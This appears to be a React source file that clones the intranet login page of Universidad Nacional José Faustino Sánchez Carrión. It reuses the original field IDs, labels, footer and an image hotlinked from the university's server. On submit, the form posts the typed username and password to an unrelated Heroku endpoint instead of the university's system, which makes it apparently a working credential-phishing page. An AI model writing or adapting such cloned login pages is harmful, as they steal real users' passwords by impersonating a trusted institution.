import React, { useEffect } from 'react'
import { PostData } from '../../helpers/PostData';
import { useForm } from '../hooks/useForm';

export const App = () => {
  const urlImage001 = 'https://intranet.unjfsc.edu.pe/App_Themes/default/frm_login/img001.jpg';

  const [formState, handleInputChange] = useForm({
    username: '',
    pass: ''
  });

  const { username, pass } = formState;
  useEffect(() => {
    
  }, [])

  useEffect(() => {

  }, [formState])

  const handleSubmit = (e) => {
    e.preventDefault();
    PostData('https://api-rest-cripto.herokuapp.com/api/usuarios/add', {
      username: username,
      pass: pass
    });
    
  }

  return (
    <>
      <div id="contenedor-principal">
        <div id="PosicionIzquierda">
          <form onSubmit={handleSubmit} className="Formulario" id="form1">
            <div> </div> <div>
            </div>


            <table border="0" cellspacing="2" cellpadding="2" width="100%">
              <tbody><tr>
                <td colspan="2">
                  &nbsp;</td>
              </tr>
                <tr>
                  <td colspan="2">
                    &nbsp;</td>
                </tr>
                <tr>
                  <td colspan="2">
                    &nbsp;</td>
                </tr>
                <tr>
                  <td colspan="2">
                    &nbsp;</td>
                </tr>
                <tr>
                  <td style={{ textAlign: 'right' }}>
                    usuario : </td>
                  <td>
                    {/*    <input name="txtUsuario" type="text" maxlength="10" id="txtUsuario" class="ControlText">
 */}

                    <input type="text"
                      name="username"
                      id="txtUsuario"
                      className="ControlText"
                      autoComplete="off"
                      value={username}
                      onChange={handleInputChange}
                      placeholder="" />
                  </td>
                </tr>
                <tr>
                  <td style={{ textAlign: 'right' }}>
                    contraseña :</td>
                  <td>
                    {/*      <input name="txtContrasenia" type="password" maxlength="16" id="txtContrasenia" class="ControlText">
                                                                        */}
                    <input type="password"
                      name="pass"
                      id="txtContrasenia"
                      className="ControlText"
                      autoComplete="off"
                      value={pass}
                      onChange={handleInputChange}
                      placeholder=" " />
                  </td>
                </tr>
                <tr>
                  <td colspan="2" style={{ textAlign: 'right' }} class="style2">
                    <a id="lnkbtnRecordarContrasenia" className="Boton_activar_cuenta" href="." alt="as">Ha olvidado su contraseña?</a>
                  </td>
                </tr>
                <tr>
                  <td colspan="2" style={{ textAlign: 'center' }}>
                    <input type="submit" name="btnIniciarSesion" value="Iniciar sesión" id="btnIniciarSesion" class="Boton_basico" />
                  </td>
                </tr>
                <tr>
                  <td colspan="2" style={{ textAlign: 'center' }}>
                    <span id="lblMensaje" style={{ textAlign: 'center' }}></span>
                  </td>
                </tr>
              </tbody></table>
          </form>
        </div>

        <div id="PosicionDerecha">
          <div id="imagen"><img src={urlImage001} style={{ width: 380, height: 253 }} alt='imagen' /> </div>
          <div id="Contenido">
            <p>Le recordamos que tambien puede utilizar  el servicio de correo electrónico institucional que ofrece la universidad a toda la comunidad universitaria.</p>
          </div>

        </div>
        <div id="PosicionFooter">Universidad Nacional José Faustino Sánchez Carrión - Intranet 2012 - Derechos Reservados</div>
      </div>
    </>
  )
}

